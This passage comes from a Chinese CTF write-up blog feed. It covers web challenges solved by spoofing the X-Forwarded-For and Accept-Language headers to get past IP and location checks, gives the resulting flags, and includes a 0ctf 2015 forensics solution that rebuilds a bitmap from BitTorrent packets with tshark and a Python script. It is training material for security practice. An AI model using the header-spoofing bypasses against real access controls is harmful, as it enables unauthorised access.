class="string">"HTTP_X_FORWARDED_FOR"</span>]))</div><div class="line">	$cip = $_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]))</div><div class="line">	$cip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</div><div class="line"><span class="keyword">else</span></div><div class="line">	$cip = <span class="string">"0.0.0.0"</span>;</div><div class="line"><span class="keyword">return</span> $cip;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$GetIPs = GetIP();</div><div class="line"><span class="keyword">if</span> ($GetIPs==<span class="string">"1.1.1.1"</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Great! Key is *********"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"错误！你的IP不在访问列表之内！"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>抓包，添加X-Forwarded-For: 1.1.1.1</p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SimCTF&#123;daima_shengji&#125;</div></pre></td></tr></table></figure></p>
<h1 id="猫捉老鼠"><a href="#猫捉老鼠" class="headerlink" title="猫捉老鼠"></a>猫捉老鼠</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/6.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#WWWnsf0cus_NET#</div></pre></td></tr></table></figure>
<h1 id="forbiden"><a href="#forbiden" class="headerlink" title="forbiden"></a>forbiden</h1><p>题目说:Make sure you are in HongKong<br>抓包，修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Accept-Language: zh-hk</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">123JustUserAGent</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实验吧-web-writeup（持续更新）&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>0ctf-2015-Peers-writeup</title>
    <link href="http://yoursite.com/2017/07/23/0ctf-2015-Peers-writeup/"/>
    <id>http://yoursite.com/2017/07/23/0ctf-2015-Peers-writeup/</id>
    <published>2017-07-23T04:46:21.000Z</published>
    <updated>2017-07-28T07:22:42.263Z</updated>
    
    <content type="html"><![CDATA[<p>0ctf-2015-Peers-writeup<br><a id="more"></a></p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>题目提供了一个流量包peers.pcapng，<br>peers.pcapng:<br>链接：<a href="http://pan.baidu.com/s/1nuGXACL" target="_blank" rel="external">http://pan.baidu.com/s/1nuGXACL</a> 密码：zwl3</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>用wireshark的追踪tcp流查看。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/1.jpg?raw=true" alt=""></p>
<p>可以看到这是关于BitTorrent协议的包。wireshark中有针对BitTorrent protocol的协议解析器。但该解析器默认是工作在端口6881上，这也是BitTorrent protocol工作的常用端口。而在题目提供的流量包中，这些流量是通过80端口的，所以我们需要对流量包进行“修正”。</p>
<h2 id="改端口"><a href="#改端口" class="headerlink" title="改端口"></a>改端口</h2><p>我们可以利用<a href="http://tcpreplay.synfin.net/wiki/tcprewrite" target="_blank" rel="external">tcprewrite</a>这个工具来修改流量包。为把端口80修改为端口6881，使用下述命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcprewrite --portmap=80:6881 --infile=peers.pcapng --outfile=peers_output.pcap</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/2.jpg?raw=true" alt=""></p>
<h2 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h2><p>接下去就是把这些BitTorrent的内容提取出来，：）可以手动提取。比如在过滤器处先填入<code>bittorrent.piece.index &gt;= 0</code>，之后将三十九个数据包按照index的顺序将<code>bittorrent.piece.data</code>的十六进制复制到hex编辑器中。</p>
<p>也可以利用工具<a href="https://www.wireshark.org/docs/man-pages/tshark.html" target="_blank" rel="external">tshark</a>。使用下面命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tshark -r peers_output.pcap -Y &apos;bittorrent.piece.data&apos; -Tfields -e bittorrent.piece.index -e bittorrent.piece.data &gt; pieces</div></pre></td></tr></table></figure></p>
<p><code>-r</code>选项表示读入一个文件，<code>-Y</code>是用于选择过滤器，<code>-Tfilelds</code>用来设置输出格式。<code>-e</code>选项表示要列出的内容，因为我们最后要根据index来对data进行排序重组，所以有两个<code>-e</code>。最后我们将文件流保存到文件<code>pieces</code>中。</p>
<p>文件<code>pieces</code>内容如下，第一列是index，第二个是对应的data：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x00000000	42:4d:36:c4:09:00:00.....</div><div class="line">0x00000020	69:ff:ae:84:78:ff:a6.....</div><div class="line">0x00000017	5b:ff:96:66:5a:ff:9a.....</div><div class="line">省略</div></pre></td></tr></table></figure></p>
<h2 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h2><p>接下去，就是根据index的顺序重组文件，用下面的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">temp = &#123;&#125;</div><div class="line">peer = open(<span class="string">"pieces"</span>,<span class="string">"rb"</span>)</div><div class="line">result = open(<span class="string">"result"</span>,<span class="string">"w+"</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> peer:</div><div class="line">	index = int(line[<span class="number">0</span>:<span class="number">10</span>],<span class="number">16</span>)</div><div class="line">	data   = line[<span class="number">11</span>:<span class="number">-1</span>].replace(<span class="string">":"</span>,<span class="string">""</span>).decode(<span class="string">"hex"</span>)</div><div class="line">	temp[index] = data</div><div class="line">peer.close()</div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> sorted(temp):</div><div class="line">	result.write(temp[index])</div><div class="line">result.close()</div></pre></td></tr></table></figure></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop<span class="comment"># python peer.py</span></div><div class="line">root@chybeta:~/Desktop<span class="comment"># file result</span></div><div class="line">result: PC bitmap, Windows 3.x format, 800 x 200 x 32</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170723/3.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0ctf-2015-Peers-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
</feed>
